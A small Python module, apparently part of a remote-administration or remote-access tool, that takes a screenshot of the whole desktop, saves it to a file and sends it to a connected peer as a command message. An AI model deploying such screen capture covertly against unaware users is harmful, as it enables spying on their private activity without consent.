import os

from PIL import ImageGrab

from core.Command import Command


class Screen(object):
    def __init__(self, command, client):
        self.__command = command
        self.__client = client
        self.__screen_file = 'screen.jpg'

    def capture(self):
        img = ImageGrab.grab()
        img = img.convert('RGB')
        img.save(self.__screen_file)
        self.send()

    def send(self):
        command = Command()
        command.set_type(3)
        command.set_data_length(os.path.getsize(self.__screen_file))
        with open(self.__screen_file, 'rb') as f:
            command.set_data(f.read())
        self.__client.send_command(command)
